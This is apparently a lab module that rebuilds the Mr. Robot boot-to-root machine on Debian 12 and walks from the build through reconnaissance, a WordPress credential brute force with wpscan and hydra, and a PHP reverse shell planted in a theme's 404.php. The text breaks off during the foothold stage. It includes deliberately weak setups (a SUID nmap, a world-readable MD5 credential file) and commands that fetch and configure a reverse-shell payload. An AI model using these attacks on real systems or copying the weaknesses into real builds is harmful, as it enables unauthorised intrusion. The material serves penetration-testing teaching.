# Educational module: Mr Robot

This lab rebuilds the well-known **Mr. Robot: 1** boot-to-root machine (the VulnHub box by Leon
Johnson, inspired by the TV series *Mr. Robot*) as a **Debian 12** virtual machine that you build
and administer yourself. You play two roles in sequence.

First you are the **administrator**: you install the packages, create the accounts, publish the
site over HTTP and HTTPS, put WordPress in front of MariaDB, and place the three keys. Then you put
the admin hat down, pick up the attacker hat, and take the machine from an empty nmap scan to a
root shell using only what is published.

The original box shipped Ubuntu 14.04 with a Bitnami WordPress 4.3.1 tree and 512 MB of RAM. This
rebuild keeps the same attack chain on a Debian 12 base using distro packages
(`apache2` + `libapache2-mod-php`, `mariadb-server` bound to loopback only), a WordPress install
under `/var/www/html`, the same `robot` account (uid 1002, **not** in `sudo`), and the same three
keys. Everything the original box teaches, this build teaches. Where the platforms genuinely
differ — the clearest example is that modern `nmap` no longer has the interactive console the
original box was famous for — this module says so and teaches the modern equivalent of the *same
technique* instead of pretending the old binary still exists.

Three keys are hidden at three privilege levels. `key-1-of-3.txt` is reachable from the web,
`key-2-of-3.txt` belongs to the local user `robot`, and `key-3-of-3.txt` belongs to `root`. Each
key is harder to reach than the last, which is the point: the machine is a ladder.

## What you will learn

By the end of this module you can:

- Build a reproducible, documented target VM (Debian 12, host-only + NAT, three published
  services) and verify what it actually exposes.
- Read a port scan and separate *published* services from *loopback-only* services, and explain
  why that distinction matters to an attacker.
- Recognise what a web server volunteers for free: `robots.txt`, headers, error pages, WordPress
  fingerprints.
- Turn a **wordlist leak** into a **WordPress administrator account**, using username enumeration
  and a credential attack with `fsocity.dic` (the same method the public box intended).
- Get remote code execution as the web server user by abusing the WordPress theme file editor
  (Appearance → Editor → `404.php`), and catch a **PHP reverse shell** with `nc`.
- Do real post-exploitation: `whoami`, `id`, listing other users' homes, and spotting which
  artefacts you can read and which you cannot.
- Recover a credential from a local file (`password.raw-md5`) by cracking an MD5 hash, then
  switch user with `su`.
- Explain **why a SUID binary yields root**, find it with `find / -perm -4000`, and abuse it. The
  original box used SUID `nmap`; you will learn the technique both the classic way and the way it
  works on current `nmap`.
- Capture the final proof of ownership (`/root/key-3-of-3.txt`) and write up the whole chain.
- Look at every step from the defender's side and say how it should have been fixed.

## Target and topology

| Item | Value |
| --- | --- |
| OS | Debian 12 (bookworm) |
| RAM | 512 MB |
| Disk | 16 GB |
| Hostname | `MrRobot` |
| Adapter 1 | host-only, `192.168.56.20/24` (your workstation is `192.168.56.1`) |
| Adapter 2 | NAT (gives the guest a route to the internet for package installs) |
| Administrator account you build with | `bloodraven`, uid 1003, in group `sudo` |
| Attack-surface account | `robot`, uid 1002, **not** in `sudo` |

The two adapters matter. **Host-only** puts the target on the same private segment as your
attacking workstation, so you can scan it and receive a reverse shell from it. **NAT** lets the
target pull packages while leaving it unreachable from the internet. Neither adapter exposes the
target to your production LAN.

### What is published, and what is not

| Port | Service | Reachable from `192.168.56.1`? | Notes |
| --- | --- | --- | --- |
| 22/tcp | OpenSSH `sshd` | yes | `PermitRootLogin no` — password and key auth for the two user accounts |
| 80/tcp | Apache, WordPress over **plain HTTP** | yes | The main attack surface in this lab |
| 443/tcp | Apache TLS via `default-ssl` + `ssl-cert` | yes | Self-signed snakeoil certificate |
| 3306/tcp | MariaDB | **no** — bound to `127.0.0.1` only | Reachable only from inside the guest |
| 21/tcp | FTP | **no** — nothing listens | No FTP server is installed in this build |

Two deliberate facts to internalise before you attack:

1. **The database is loopback-only.** `bind-address = 127.0.0.1` means MariaDB never accepts a
   connection from the network. You cannot attack MySQL remotely, you cannot brute-force it from
   your workstation, and `nmap -p3306 192.168.56.20` will not show it as open. Any database
   access has to come *through* the web application or from a shell on the box.
2. **Port 21 stays closed.** There is no FTP. Early enumeration often loses time here — do not.

WordPress talks to MariaDB over the loopback socket, and PHP runs inside Apache as the
`www-data` user, so every web-driven compromise lands you as `www-data`. That is your foothold;
`robot` and `root` still stand above it.

> **Hint:** Before you attack anything, write down the three privilege levels you need to cross:
> `www-data` → `robot` → `root`. Every command you run afterwards should be traceable to one of
> those two jumps.

## Build the lab

This section is the administrator half of the exercise. It keeps every build step of the original
lab and adds the *why* for each one, plus the extra steps needed to make the box behave like the
original Mr. Robot machine (WordPress at the site root, the leaked wordlist, and the three keys).

### 1. Create the machine and its network

Follow [virtual-machine.md](../../resources/virtual-machine.md) with hostname `MrRobot`,
RAM **512 MB**, and address **192.168.56.20**. Adapter 1 is **host-only**, Adapter 2 is **NAT**.
Copy `resources` to `/opt/student-resources`.

```bash
sudo mkdir -p /opt/student-resources
sudo cp -a /path/to/resources/. /opt/student-resources/
```

**What this does.** The VM gets 512 MB of RAM because that is what the original box had; it is
small on purpose and it will keep you honest about lean services. The host-only adapter is the one
that makes the attack possible: your workstation and the target end up on `192.168.56.0/24` with
no router between them. NAT exists only so the guest can reach Debian mirrors. `/opt/student-resources`
holds the image set you will publish, so the build never depends on your host's directories.

**You should see.** Inside the guest, `ip -4 addr show` reports `192.168.56.20/24` on the
host-only interface and a `10.0.2.x/24` style address from the NAT adapter. `hostname` prints
`MrRobot` (if it does not, continue — step 2 sets it).

**If you get stuck.** If the guest boots with a `10.0.2.x` address only, the host-only adapter is
not attached: power off the VM, check Adapter 1 in the network settings, and confirm the adapter
name matches the one your VirtualBox host-only network uses.

### 2. Packages, hostname, and SSH

```bash
sudo apt-get update
sudo apt-get install -y openssh-server sudo apache2 libapache2-mod-php php cron ssl-cert mariadb-server
sudo hostnamectl set-hostname MrRobot
sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
sudo systemctl reload ssh || sudo systemctl reload sshd
```

**What this does.**

- `openssh-server` publishes port 22 — the only non-web way in.
- `sudo` is what makes the `bloodraven` account a real administrator.
- `apache2` + `libapache2-mod-php` + `php` give you Apache with PHP running *inside* the Apache
  worker. This is why every web exploit in this lab lands as `www-data`: mod_php executes your
  PHP in the web server's own process, with the web server's uid.
- `cron` is installed for the package schedule only (`cron.daily`, `cron.weekly`, ...). Nothing in
  this lab depends on a custom cron job, so there is no scheduled-task attack to find. Knowing
  that a path is *closed* is part of good enumeration.
- `ssl-cert` provides the self-signed snakeoil certificate that `default-ssl` will use.
- `mariadb-server` is the WordPress database — and, as configured in step 6, it stays local.
- `hostnamectl set-hostname MrRobot` sets the persistent hostname, which is what appears in the
  SSH banner and in shell prompts later.
- The `sed` line rewrites `PermitRootLogin` (commented or not) to `no`, so root cannot log in over
  SSH even with a password; you must be `bloodraven` and use `sudo`.

**You should see.** `systemctl is-active apache2 mariadb ssh` prints `active` for all three.
`sshd -T | grep permitrootlogin` prints `permitrootlogin no`.

**Common problems.**

- If `systemctl reload ssh` fails, the service is named `sshd` on your base image — the `||`
  fallback covers it. If both fail, `systemctl status ssh` tells you why.
- On a 512 MB VM, `apt-get update` can be slow. Let it finish; do not interrupt it mid-unpack.
- If `php` installs a different minor PHP than the modules expect, `apt-get install -y php-mysql
  php-mbstring php-xml` will pull the matching versions (step 7 needs `php-mysql` anyway).

### 3. Accounts

```bash
sudo useradd -m -u 1002 -s /bin/bash robot
sudo useradd -m -u 1003 -s /bin/bash bloodraven
sudo usermod -aG sudo bloodraven
sudo passwd robot
sudo passwd bloodraven
```

Skip `useradd` for an account the installer already created. `robot` is **not** in group `sudo`.
Choose the passwords yourself — and write them in your own notes, because this module must stay
free of real secrets.

| Name | uid | Shell | Admin | Role in the story |
| --- | --- | --- | --- | --- |
| root | 0 | /bin/bash | console only | Holds `key-3-of-3.txt` |
| robot | 1002 | /bin/bash | no | The local user you must become; holds `key-2-of-3.txt` |
| bloodraven | 1003 | /bin/bash | group `sudo` | Your own administrator account on the box |

**What this does.** The three accounts are the three rungs of the ladder. `bloodraven` is you,
the operator, and the only account with `sudo`; it is how you build the box and how you plant the
keys. `robot` is deliberately *not* an administrator — that is what forces you to find a real
privilege-escalation path instead of just typing `sudo`. `root` has no SSH access at all, so the
only way to end as root is to escalate from inside.

**You should see.** `getent passwd robot bloodraven` returns both accounts with the uids above.

**Common problem.** If `useradd` says the uid is already taken, that account exists from the
installer. Do not force it; just set its password with `passwd`.

### 4. Web root and the images

```bash
sudo rm -rf /var/www/html/*
sudo mkdir -p /var/www/html/images/headlines /var/www/html/images/question /var/www/html/images/other
sudo cp -a /opt/student-resources/images/headlines/. /var/www/html/images/headlines/
sudo cp -a /opt/student-resources/images/question/. /var/www/html/images/question/
sudo cp -a /opt/student-resources/images/other/. /var/www/html/images/
sudo cp -a /opt/student-resources/images/other/. /var/www/html/images/other/
```

**What this does.** `/var/www/html` is Apache's document root for this build, and the three image
directories are what the site's front page displays: `headlines` (the fake news cards), `question`
(the "who is owed what" pictures), and `other` (loose assets such as `btn-play.png` and
`420.jpg`). Starting from an empty document root keeps the build reproducible.

**You should see.** `ls /var/www/html/images/*` lists the JPEGs and `btn-play.png`. On your
workstation, `http://192.168.56.20/images/headlines/deflategate.jpg`,
`http://192.168.56.20/images/question/jefferson.jpg` and `http://192.168.56.20/images/other/420.jpg`
all return an image, not a 404.

**Common problem.** The original lab lists the `other/` copy twice, which is harmless but
confusing. Copy it once — the line is kept here only so the step-for-step build still matches.
Also note `-a` (archive): it preserves ownership, so re-check ownership after any `cp -a` from
your host.

### 5. TLS on port 443

```bash
sudo a2enmod ssl
sudo a2ensite default-ssl
sudo systemctl reload apache2
```

**What this does.** `a2enmod ssl` loads Apache's SSL engine, `a2ensite default-ssl` enables the
`/etc/apache2/sites-available/default-ssl.conf` virtual host that listens on 443 and points at
the snakeoil key/certificate pair created by `ssl-cert`. The result is a *second* door into the
same content: port 80 plain, port 443 encrypted but with a certificate nobody trusts.

**You should see.** `curl -sk -o /dev/null -w 'https %{http_code}\n' https://127.0.0.1/` prints
`https 200`. From your workstation, `curl -skI https://192.168.56.20/` returns `HTTP/1.1 200 OK`
and `Server: Apache`. `-k` is needed because the certificate is self-signed.

**Common problems.**

- If 443 does not answer, `apache2ctl -M | grep ssl` tells you whether the module loaded and
  `apache2ctl configtest` tells you whether the vhost is valid.
- Apache will only bind 443 if `Listen 443` is active — `default-ssl.conf` provides it.

### 6. MariaDB on loopback only

```bash
printf '[mysqld]\nbind-address = 127.0.0.1\n' | sudo tee /etc/mysql/mariadb.conf.d/99-local.cnf
sudo systemctl restart mariadb
```

**What this does.** MariaDB's default is to listen on every interface. This drop-in file binds it
to `127.0.0.1` so it answers only from inside the guest — the single most important hardening step
in this build, and the reason the database is *not* part of the attack surface.

**You should see.** `ss -lnt | grep 3306` shows `127.0.0.1:3306` (not `0.0.0.0:3306` and not
`*:3306`). From your workstation, `nmap -p3306 192.168.56.20` shows the port as **closed** or
**filtered**, never open.

**Common problem.** If you ever need WordPress to reach the database over TCP instead of the
socket, keep the bind address and use `127.0.0.1` as the DB host in `wp-config.php` — TCP to
loopback is still local, and it does not undo the hardening.

### 7. Enable the package cron schedule

```bash
sudo systemctl enable --now cron
sudo ls /etc/cron.d
```

**What this does.** Starts the cron daemon and puts the standard Debian package schedules
(`cron.daily`, `cron.weekly`, `cron.monthly`) to work. There are no custom jobs in `/etc/cron.d`
in this build, so nothing here is exploitable — it exists so you can *prove* that during
enumeration instead of hoping.

**You should see.** `systemctl is-enabled cron` prints `enabled`; `ls /etc/cron.d` is empty.

### 8. Install WordPress at the site root

The original box ran WordPress from the web root, so `/wp-login.php`, `/wp-admin` and the leaked
files all sit at the top level. Do the same here: install WordPress **into** `/var/www/html`, not
into a subdirectory.

```bash
# PHP extensions WordPress needs (these add no network service)
sudo apt-get install -y php-mysql php-mbstring php-xml php-gd php-curl php-zip unzip curl

# Fetch the current WordPress release and unpack it into the document root
cd /tmp
curl -sSLo wordpress.tar.gz https://wordpress.org/latest.tar.gz
sudo tar -xzf wordpress.tar.gz -C /var/www/html --strip-components=1

# Create the database and its user inside the loopback-only MariaDB
sudo mysql <<'SQL'
CREATE DATABASE wordpress CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
CREATE USER 'wpuser'@'localhost' IDENTIFIED BY 'choose-a-db-password';
GRANT ALL PRIVILEGES ON wordpress.* TO 'wpuser'@'localhost';
FLUSH PRIVILEGES;
SQL

# Configure WordPress and record the version it actually installed
cd /var/www/html
sudo cp wp-config-sample.php wp-config.php
sudo sed -i "s/database_name_here/wordpress/; s/username_here/wpuser/; s/password_here/choose-a-db-password/" wp-config.php
sudo sed -i "s/define( 'DB_HOST', 'localhost' );/define( 'DB_HOST', '127.0.0.1' );/" wp-config.php
sudo sed -i "/put your unique phrase here/d" wp-config.php
curl -s https://api.wordpress.org/secret-key/1.1/salt/ | sudo tee -a wp-config.php >/dev/null
grep wp_version wp-includes/version.php
```

**What this does.**

- `php-mysql` supplies the `mysqli`/`pdo_mysql` extension WordPress uses to talk to MariaDB;
  without it you get the classic "Your PHP installation appears to be missing the MySQL extension
  which is required by WordPress" error. `php-mbstring`, `php-xml`, `php-gd`, `php-curl` and
  `php-zip` cover the functions WordPress and its plugins expect on a modern install.
- Unpacking with `--strip-components=1` drops the `wordpress/` directory the tarball contains and
  lays the files directly into `/var/www/html`, next to the `images/` tree.
- The SQL block creates a dedicated database user with rights *only* on the `wordpress` schema —
  the same least-privilege pattern the original box used with its `bn_wordpress` account.
- `DB_HOST` is set to `127.0.0.1` on purpose: it forces a TCP connection to the loopback address
  rather than the unix socket. It still never leaves the machine, and it mirrors "the database
  listens on 127.0.0.1 only".
- The `salt` lines are per-installation secrets; deleting the placeholder line and appending fresh
  salts from the WordPress API gives this install its own session keys. If the guest has no
  internet route (Adapter 2 unplugged), generate them locally with
  `for i in $(seq 8); do openssl rand -base64 48; done` and paste them in by hand.
- `grep wp_version wp-includes/version.php` records the exact WordPress version you installed —
  write it in your notes, because "which version am I actually attacking" is the first question of
  any write-up and the answer moves with every release.

**Finish the install in a browser.** Open `http://192.168.56.20/wp-admin/install.php`, choose the
language, then set the site title (the original was a `Mr. Robot` flavour title), and create the
**first** administrator account. This first account is your own admin account, not the CTF
account — give it a strong password you keep.

**You should see.** `http://192.168.56.20/` returns `200` and shows the site, not the WordPress
installer. `curl -s http://192.168.56.20/wp-login.php | head` contains a WordPress login form, and
the HTML `<head>` carries a `<meta name="generator" content="WordPress x.y.z" />` tag.

**Common problems.**

- *"Error establishing a database connection"* — the database name/user/password in `wp-config.php`
  do not match the SQL you ran, or MariaDB is not running. Test with
  `mysql -u wpuser -p'choose-a-db-password' -h 127.0.0.1 wordpress -e 'select 1;'`.
- *White screen / HTTP 500* — a PHP fatal error. `sudo tail -n 20 /var/log/apache2/error.log`.
- *The installer redirects to a subdirectory* — you unpacked into `/var/www/html/wordpress`. Move
  the contents up one level, or fix `DocumentRoot`.
- *Permissions.* After the tarball is unpacked the files are owned by root. WordPress can still
  run (PHP only needs to read), but the theme editor of step 9 needs to *write*, so set the
  document root's ownership to the web user now:
  `sudo chown -R www-data:www-data /var/www/html`.

### 9. Plant the challenge: the leaked wordlist and the three keys

This is the step that turns a generic Debian build into the Mr. Robot challenge. It mirrors what
the original box leaked to anyone who asked.

```bash
# --- KEY 1: a file in the web root, and the wordlist that hints at it
printf 'User-agent: *\nfsocity.dic\nkey-1-of-3.txt\n' | sudo tee /var/www/html/robots.txt
printf '%s\n' 'key-1-goes-here' | sudo tee /var/www/html/key-1-of-3.txt

# Build fsocity.dic (a wordlist that contains the CTF credentials, exactly like the original)
sudo apt-get install -y wamerican            # provides /usr/share/dict/words
{ sort -u /usr/share/dict/words; printf '%s\n' 'elliot' 'ER28-0652'; } | sort -u > /tmp/fsocity.dic
wc -l /tmp/fsocity.dic                        # a few tens of thousands of candidates
sudo cp /tmp/fsocity.dic /var/www/html/fsocity.dic

# --- The CTF WordPress administrator
# (in wp-admin: Users -> Add New, username 'elliot', role Administrator, a password
#  that you also appended to the wordlist above)

# --- KEY 2 and the credential that opens it (in the robot account's home)
ROBOT_PW='a-password-you-choose'
printf 'robot:%s\n' "$(printf '%s' "$ROBOT_PW" | md5sum | cut -d' ' -f1)" \
  | sudo tee /home/robot/password.raw-md5
printf '%s\n' 'key-2-goes-here' | sudo tee /home/robot/key-2-of-3.txt
sudo chown robot:robot /home/robot/password.raw-md5 /home/robot/key-2-of-3.txt
sudo chmod 644 /home/robot/password.raw-md5
sudo chmod 400 /home/robot/key-2-of-3.txt

# --- KEY 3: root only
printf '%s\n' 'key-3-goes-here' | sudo tee /root/key-3-of-3.txt
sudo chmod 400 /root/key-3-of-3.txt
```

**What this does.**

- `robots.txt` is a file *web crawlers* read, but every attacker reads it too, because it routinely
  lists exactly the paths an organisation does not want indexed. On the original box it listed
  `fsocity.dic` and `key-1-of-3.txt`, and this build reproduces that leak verbatim.
- `fsocity.dic` is the wordlist. On the original box it was an 858,160-line file that collapsed to
  11,451 unique entries after `sort | uniq`. What makes it a vulnerability is not its size — it is
  that **the credentials live inside a file the web server hands to anyone**. This build generates
  a candidate list from the system dictionary and appends the CTF credentials to it. Keep it
  honest: the list must contain the `elliot` password, otherwise the intended attack is impossible.
  `sort | uniq` matters for speed; do it.
- The CTF administrator account `elliot` is a second WordPress admin. On the original box the
  intended account was `elliot`; other accounts existed but were not administrators, which is
  why logging in as the wrong one "worked" but got you nowhere.
- `password.raw-md5` is a **local file that contains an unsalted MD5 of the `robot` password**. The
  original box shipped exactly this: a world-readable line `robot:<32 hex characters>`. It is
  deliberately crackable, and the cracked plaintext is the `robot` password.
- The permission split is the whole puzzle of key 2: `key-2-of-3.txt` is mode `400` and owned by
  `robot`, so `www-data` cannot read it; `password.raw-md5` is mode `644`, so it can. The only way
  to the key is *through* the credential.
- `key-3-of-3.txt` is mode `400` in `/root`, which the web user cannot even enter.

> **Variant worth knowing.** Some versions of this challenge store the second-stage credential
> *encoded* (base64 or rot13) rather than as an MD5. If you build it that way, or if you ever meet
> such a file, the method is identical: read it, identify the encoding, decode it, use the result
> as the password. `file`, `base64 -d` and `tr 'A-Za-z' 'N-ZA-Mn-za-m'` are the tools. Do not
> assume the format — identify it.

**You should see.**

- `curl -s http://192.168.56.20/robots.txt` prints the three lines above.
- `curl -s http://192.168.56.20/key-1-of-3.txt` prints your key 1 string.
- `curl -s http://192.168.56.20/wfocity.dic | wc -l` (typo intentional: `fsocity.dic`) reports the
  same line count as `/tmp/fsocity.dic`.
- `sudo ls -l /home/robot /root` shows `key-2-of-3.txt` as `-r-------- robot robot` and
  `key-3-of-3.txt` as `-r-------- root root`.

**Common problems.**

- If `fsocity.dic` is served as a download instead of text, that is fine — `wget` it.
- If WordPress refuses the `elliot` username (some installs reject names that match a role), use
  the SQL route: insert the user from the shell with `wp-cli` or a direct `INSERT` into
  `wp_users`, then make it an administrator in `wp_usermeta`. The name matters, not the method.
- `wamerican` is a build-time convenience only. If you prefer no extra packages, build the list
  from the WordPress source itself: `tr -c '[:alnum:]' '\n' < wp-includes/version.php | tr
  'A-Z' 'a-z' | sort -u` plus the credentials.

### 10. The deliberate weakness: a SUID `nmap`

The original box's privilege escalation was a SUID root `nmap`, used through its interactive
console. Reproduce the weakness, on the current binary, and know exactly what you are doing.

```bash
sudo apt-get install -y nmap
sudo chmod u+s /usr/bin/nmap
ls -l /usr/bin/nmap
```

**What this does.** `chmod u+s` sets the **setuid** bit and leaves the file owned by root. From
now on, when any unprivileged user runs `/usr/bin/nmap`, the kernel starts the process with an
**effective uid of 0**. The real uid stays the caller's (33, `www-data`, or 1002, `robot`), but
permission checks are made against the effective uid — which is precisely why this is dangerous.
`nmap` on Debian is normally shipped with file capabilities (`cap_net_raw`) instead of SUID,
because a network scanner needs raw sockets, not root; setting SUID instead is a *misconfiguration*
that hands out far more than raw sockets.

**You should see.** `ls -l /usr/bin/nmap` shows the `s` where the owner execute bit normally is:
`-rwsr-xr-x 1 root root ... /usr/bin/nmap`. `find / -xdev -perm -4000 -type f 2>/dev/null` lists
it alongside the usual Debian setuid binaries.

**Common problem.** Do not set SUID on anything else while you are here. One deliberate flaw is a
lesson; three is noise.

### 11. Verify the build before you attack it

```bash
ss -lnt | awk 'NR==1 || /:22|:80|:443|:3306|:21/'
curl -sk -o /dev/null -w 'home %{http_code}\n' https://127.0.0.1/
curl -s -o /dev/null -w 'head %{http_code}\n' http://127.0.0.1/images/headlines/deflategate.jpg
curl -s -o /dev/null -w 'question %{http_code}\n' http://127.0.0.1/images/question/jefferson.jpg
curl -s -o /dev/null -w 'other %{http_code}\n' http://127.0.0.1/images/other/420.jpg
getent passwd robot bloodraven
sudo visudo -c
sudo ls /etc/cron.d
dpkg-query -W apache2 openssh-server cron sudo mariadb-server
```

**What this does.** One command block that proves the shape of the target: which ports listen
where, that the site answers on both 80 and 443, that the images resolve, that the accounts exist,
that the sudoers file parses, that cron has no custom jobs, and that the expected packages are
installed. Run it as the last build step and again after any change — an attack against a target
you have not verified wastes an afternoon.

**You should see.**

- Port 22, 80 and 443 listening on `0.0.0.0`/`*`, port 3306 listening on `127.0.0.1` **only**, and
  no line for port 21 at all.
- `home 200`, `head 200`, `question 200`, `other 200`.
- `visudo -c` reports `parsed OK`.

The picture checks return 200. Port 3306 is `127.0.0.1` only. Port 21 is absent.

## Boot to root

Everything below runs from your workstation (`192.168.56.1`, the host-only side) against
`192.168.56.20`, except where a command clearly runs on the target. The chain is:

**nmap → robots.txt (KEY 1) → WordPress admin → theme editor reverse shell as `www-data` →
`/home/robot/password.raw-md5` → cracked password → `su robot` (KEY 2) → SUID `nmap` → root
(KEY 3).**

Do the stages in order. Each one tells you what to run, what you should see, and what to do next.

### Stage 1 — Reconnaissance

You cannot attack what you have not found. Start by confirming the target is alive and what it
publishes.

```bash
ping -c 2 192.168.56.20
sudo nmap -sS -sV -sC -p- --open -T4 192.168.56.20
```

**What this does.** `ping` proves the host-only route works (VirtualBox host-only answers it).
`nmap -p-` scans all 65,535 TCP ports; `--open` hides the closed ones so the output stays
readable; `-sV` asks each open port to identify itself by banner; `-sC` runs the default, safe
NSE scripts (which is what discovers `robots.txt`, the WordPress login, and the certificate's
common name).

**You should see** something like:

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 9.x (protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.x
443/tcp open  ssl/http Apache httpd 2.4.x
| http-robots.txt: 3 disallowed entries
|_/fsocity.dic /key-1-of-3.txt
| ssl-cert: Subject: commonName=MrRobot
```

The version strings move with Debian point releases, so do not treat them as fixed. What is fixed
is the **shape**: three ports, SSH plus HTTP plus HTTPS-with-a-bad-certificate, and a
`robots.txt` that names two interesting paths.

**Now do this.** Note that 3306 is absent. That is not an oversight — it is the loopback bind from
the build. If you want to prove it to yourself:

```bash
nmap -p3306 192.168.56.20
```

It reports `closed` or `filtered`, never `open`. The database is not part of your attack surface.

> **Hint:** If you only ever run one scan command in a lab, make it `nmap -p- --open -sV`. A
> default `nmap <ip>` scans 1,000 ports and would miss anything unusual. This box publishes only
> three ports, but the habit is the lesson.

**Common problem.** If you see nothing at all, check that your attacking machine is on
`192.168.56.0/24` and that the target still has `192.168.56.20`. `ip route get 192.168.56.20`
shows which interface the packets leave through. A Windows host with VirtualBox host-only
networking usually gives the host `.1`.

### Stage 2 — Web enumeration: `robots.txt` and KEY 1

Now walk the web services in order of information gained per request.

```bash
curl -sI http://192.168.56.20/
curl -s http://192.168.56.20/robots.txt
curl -s http://192.168.56.20/key-1-of-3.txt
curl -skI https://192.168.56.20/
```

**What this does.** The first command dumps the HTTP response headers, which often volunteer the
server software, the PHP version (`X-Powered-By` on some setups) and the date. The second reads
`robots.txt` — the file a site owner writes to tell crawlers what *not* to index, which in
practice tells an attacker exactly where the interesting things are. The third fetches the file it
advertises. The fourth repeats the check over TLS, because a site that serves both plain and
encrypted traffic deserves to be checked on both.

**You should see.**

- Headers including `Server: Apache` and, on the HTTPS side, a `subject: commonName=MrRobot`.
- `robots.txt` containing exactly:
  ```text
  User-agent: *
  fsocity.dic
  key-1-of-3.txt
  ```
- `/key-1-of-3.txt` returning your key-1 string in plain text. **Save it.** That is key 1 of 3,
  and it required no exploit at all — only reading a file the server hands to everyone.

**Now do this.** Download the wordlist and inspect it before you use it:

```bash
wget -q http://192.168.56.20/fsocity.dic -O fsocity.dic
wc -l fsocity.dic
sort fsocity.dic | uniq | tee fsocity.uniq | wc -l
head -5 fsocity.uniq
```

**What this does.** On the original box `fsocity.dic` was 858,160 lines with enormous duplication;
`sort | uniq` collapsed it to 11,451 candidates, which is the difference between a run that takes
hours and one that takes minutes. `head` tells you what kind of list you actually have — a word
list, a password list, or random strings.

**You should see.** A line count smaller than the raw file, and a list of human-readable words
including `elliot` and the CTF password you appended.

**Common problems.**

- If `robots.txt` returns 404, you skipped the build step that creates it — or your document root
  is not `/var/www/html`.
- If `/key-1-of-3.txt` returns the Apache default page instead, the file is in the wrong place:
  it must be directly inside the web root.

> **Hint:** A wordlist in the web root is a *hint*, not the answer. It tells you the box expects a
> credential attack. Confirm that by looking for the login form before you spend any time on the
> list.

### Stage 3 — WordPress: fingerprint, user enumeration, credential attack

Find the application behind the site, then attack its authentication.

```bash
curl -s http://192.168.56.20/ | grep -i -o -E 'content="WordPress [0-9.]+"'
curl -s -o /dev/null -w 'wp-login %{http_code}\n' http://192.168.56.20/wp-login.php
curl -s -o /dev/null -w 'wp-admin %{http_code}\n' http://192.168.56.20/wp-admin/
curl -s http://192.168.56.20/wp-json/wp/v2/users
```

**What this does.** WordPress usually stamps its version in a `<meta name="generator">` tag; the
two status checks confirm the login page and the dashboard exist; the last command asks the
WordPress REST API for the user list, which in a default install enumerates usernames publicly
(the original box predates the REST API, so its intended path was the login error message — you
will see both here).

**You should see.** `200` for both WordPress paths, a version string, and a JSON array of user
objects with `slug` and `name` fields. If you see `{"code":"rest_no_route"}` the REST API is
disabled and you fall back to the login oracle below.

**3a. Confirm the login oracle (user enumeration).**

```bash
curl -s -X POST -d 'log=definitely-not-a-user&pwd=nonsense' \
  http://192.168.56.20/wp-login.php | grep -o -E 'ERROR: [^<]+|Unknown [^<]+'
curl -s -X POST -d 'log=elliot&pwd=nonsense' \
  http://192.168.56.20/wp-login.php | grep -o -E 'ERROR: [^<]+|Unknown [^<]+'
```

**What this does.** WordPress replies differently to "that user does not exist" and to "that user
exists but the password is wrong". Two requests, two accounts, two different messages — that is a
username oracle. On the original box the messages were `ERROR: Invalid username.` versus
`ERROR: The password you entered for the username elliot is incorrect.` Current WordPress may word
it differently, but it still distinguishes the two cases. Comparing them is the technique; the
exact wording is a detail you verify on the box.

**You should see.** The first request reports an unknown-username style error, the second reports
a wrong-password error. You now know `elliot` is a real account.

**3b. Brute-force the password with the leaked wordlist.**

Pick one of these two tools; `wpscan` is the friendlier one.

```bash
# wpscan (handles cookies and the WordPress login form for you)
wpscan --url http://192.168.56.20 --usernames elliot --passwords fsocity.uniq --max-threads 16

# hydra, if you prefer raw HTTP
hydra -l elliot -P fsocity.uniq 192.168.56.20 http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered"
```

**What this does.** Both take the single confirmed username and try every candidate from the
leaked list. `wpscan` needs `--usernames` (you already know the name, so do not waste time
re-enumerating) and follows WordPress's redirect/cookie behaviour, which raw tools often get
wrong. With `hydra` the failure string `The password you entered` is the marker that marks an
attempt as failed; it must match what you saw in step 3a, or hydra will silently report nothing.

**You should see.** `wpscan` ending with:

```text
[+] Performing password attack on Xmlrpc against 1 user/s
[!] Valid Combinations Found:
 | Username: elliot, Password: <the password you planted>
```

Log in at `http://192.168.56.20/wp-login.php` with those credentials. **You should see** the
WordPress dashboard — `wp-admin` with the black admin bar and the menu on the left.

**Common problems.**

- *Nothing is found.* Check that the wordlist really contains the CTF password: `grep -c
  'ER28-0652' fsocity.uniq` (or your chosen password) must return `1`.
- *Locked out / very slow.* Lower `--max-threads`. Nothing in this build rate-limits you, but a
  polite scan is easier to read.
- *hydra reports 0 valid.* The failure marker is wrong for this WordPress version. Re-run step 3a
  and copy the exact sentence it prints for a wrong password.
- *You can log in but see no dashboard.* You may be logged in as a **subscriber**, not an
  administrator. On the original box other WordPress accounts existed and were useless. Check
  `Users` in the sidebar: if you cannot see it, this account is not an administrator.

> **Hint:** Administrators can edit files. Subscribers cannot. The difference between the two is
> the difference between browsing and a shell — which is why stage 4 exists.

### Stage 4 — Foothold: a reverse shell as `www-data`

You have WordPress administrator rights, and the site's PHP runs as `www-data`. In WordPress, an
administrator can edit the PHP source of the active theme. That is remote code execution.

**4a. Start your listener first** — before you fire anything at the target, or you will miss the
connection.

```bash
# on your workstation (192.168.56.1)
rlwrap nc -lvnp 4444
```

**What this does.** `nc -lvnp 4444` listens verbosely on TCP 4444, does not resolve DNS, and does
not give up when the connection closes. `rlwrap` just gives you arrow-key history; drop it if you
do not have it. 4444 is arbitrary — any free port works.

**4b. Get the payload.**

```bash
curl -sSLo php-reverse-shell.php \
  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
sed -i "s/\$ip = '127.0.0.1';/\$ip = '192.168.56.1';/; s/\$port = 1234;/\$port = 4444;/" php-reverse-shell.php
grep -E "^\$ip|^\$port" php-reverse-shell.php
```

**What this does.** This is Pentestmonkey's well-known PHP reverse shell. It opens a TCP connection
back to your listener and pipes the remote shell's stdin/stdout over it. You must edit `$ip` and
`$port` to your own values, or the shell will dial a machine that is not listening.

**4c. Paste it into the theme's `404.php` template.**

In the browser, logged in as `elliot`:

1. Go to **Appearance → Theme File Editor**.
2. Pick the **active** theme from the drop-down in the top right (its name is the folder name; note
   it — for example `twentytwentyfour`).
3. In the file list on the right, click **`404.php`** (the "template shown when a page is not
   found" template).
4. Select all the existing content, delete it, and paste the whole contents of
   `php-reverse-shell.php`.
5. Click **Update File**.

**What this does and why it works.** WordPress lets an administrator rewrite the PHP files of the
